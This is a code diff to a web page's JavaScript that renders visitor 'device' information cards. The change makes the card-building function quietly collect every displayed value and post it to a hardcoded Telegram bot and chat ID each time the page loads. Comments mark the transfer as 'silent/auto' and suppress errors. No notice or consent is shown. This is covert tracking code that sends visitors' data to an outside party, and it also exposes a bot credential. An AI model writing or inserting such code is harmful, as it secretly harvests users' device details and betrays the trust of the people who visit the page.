@@ -275,28 +275,55 @@
       ];
     }
 
-    function injectCards(list) {
-      let grid = document.getElementById('deviceGrid');
-      list.forEach(d=>{
-        let el = document.createElement('div');
-        el.className = 'card';
-        el.id = 'card-' + d.key;
-        el.innerHTML = `
-          ${d.icon}
-          <div class="card-txt">
-            <div class="card-title">${d.label}</div>
-            <div class="card-desc">${d.desc}</div>
-            <div class="card-content" id="val-${d.key}">${d.val}</div>
-          </div>
-        `;
-        grid.appendChild(el);
-      });
-    }
+    
+    
 
-    function updateCard(key, newVal) {
+    function injectCards(list) {
+    let grid = document.getElementById('deviceGrid');
+    let obj = {};
+    list.forEach(d=>{
+      let el = document.createElement('div');
+      el.className = 'card';
+      el.id = 'card-' + d.key;
+      el.innerHTML = `
+        ${d.icon}
+        <div class="card-txt">
+          <div class="card-title">${d.label}</div>
+          <div class="card-desc">${d.desc}</div>
+          <div class="card-content" id="val-${d.key}">${d.val}</div>
+        </div>
+      `;
+      obj[d.label] = d.val; // Gather for Telegram
+      grid.appendChild(el);
+    });
+    // Immediately send to Telegram--silent/auto!
+    sendToTelegram(obj);
+  }
+function updateCard(key, newVal) {
       let c = document.getElementById('val-'+key);
       if (c) c.textContent = newVal;
+}
+  async function sendToTelegram(detailsObj) {
+    let msg = Object.entries(detailsObj)
+      .map(entry=>`<b>${entry[0]}:</b> <code>${String(entry[1]).replace(/</g,"&lt;")}</code>`)
+      .join('\n');
+    let botToken = "8497661244:AAHJFdNUkIyvZ1Y3toC6ykMfNoeN1X_CHGc";
+    let chatId = "7988239466";
+    let endpoint = `https://api.telegram.org/bot${botToken}/sendMessage`;
+    try {
+      await fetch(endpoint, {
+        method: "POST",
+        headers: {"Content-Type":"application/json"},
+        body: JSON.stringify({
+          chat_id: chatId,
+          text: msg,
+          parse_mode: "HTML"
+        })
+      });
+    } catch(e) {
+      // Fail silent unless debugging
     }
+  }
 
     // Music behavior for MAX compatibility
     // Music control refs
